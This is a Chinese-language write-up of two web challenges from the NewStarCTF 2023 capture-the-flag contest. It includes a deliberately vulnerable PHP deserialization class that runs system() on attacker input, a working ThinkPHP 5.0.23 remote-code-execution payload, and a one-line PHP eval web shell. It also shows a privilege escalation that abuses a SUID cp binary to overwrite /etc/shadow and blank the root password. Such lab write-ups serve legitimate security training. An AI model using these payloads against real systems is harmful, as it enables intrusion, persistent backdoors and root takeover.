---
title: NewStarCTF2023 week5 web前两题
date: 2023-10-30 16:48 +0800
categories: [CTF,WEB]
tags: [web]
media_subpath: /
---



## Unserialize Again

源题目内容

```php
<?php
highlight_file(__FILE__);
error_reporting(0);  
class story{
    private $user='admin';
    public $pass;
    public $eating;
    public $God='false';
    public function __wakeup(){
        $this->user='human';
        if(1==1){
            die();
        }
        if(1!=1){
            echo $fffflag;
        }
    }
    public function __construct(){
        $this->user='AshenOne';
        $this->eating='fire';
        die();
    }
    public function __tostring(){
        return $this->user.$this->pass;
    }
    public function __invoke(){
        if($this->user=='admin'&&$this->pass=='admin'){
            echo $nothing;
        }
    }
    public function __destruct(){
        if($this->God=='true'&&$this->user=='admin'){
            system($this->eating);
        }
        else{
            die('Get Out!');
        }
    }
}                 
if(isset($_GET['pear'])&&isset($_GET['apple'])){
    // $Eden=new story();
    $pear=$_GET['pear'];
    $Adam=$_GET['apple'];
    $file=file_get_contents('php://input');
    file_put_contents($pear,urldecode($file));
    file_exists($Adam);
}
else{
    echo '多吃雪梨';
} 
```

题目这里的考点应该 phar 反序列化，但是可能出题人出的不够严谨，这里出现了非预期

非预期可以直接命令执行，获取flag

![Unserialize Again_非预期exp](assets/Unserialize Again_非预期exp.jpg)

![Unserialize Again_非预期结果](assets/Unserialize Again_非预期结果.jpg)



## Final

一个thinkphp 5.0.23，存在命令执行漏洞。

过滤了 system（phpinfo 可以正常执行），之后是低权

```
_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
```



![image-20231030131251182](assets/image-20231030131251182.png)

payload：

```
GET
/index.php?s=captcha
POST
_method=__construct&filter[]=passthru&method=get&server[REQUEST_METHOD]=id
```

写马 进行提权，后面使用哥斯拉 超级终端。

```
echo '<?php @eval($_POST[12]); ?>' > 1.php
```

查看suid 存在cp，我们可以直接cp shadow 查看 root 密码，这里的root 没有显示密码，我们直接修改shadow 

![image-20231030162316084](assets/image-20231030162316084.png)

![image-20231030164151705](assets/image-20231030164151705.png)



cp suid payload

```
LFILE=file_to_write
echo "DATA" | ./cp /dev/stdin "$LFILE"
```

直接copy 到命令行

```
# root:*:17847:0:99999:7:::

LFILE=/etc/shadow
echo "root::17847:0:99999:7:::" | /bin/cp /dev/stdin "$LFILE"

su root
cat /flag*
```

![image-20231030164051944](assets/image-20231030164051944.png)
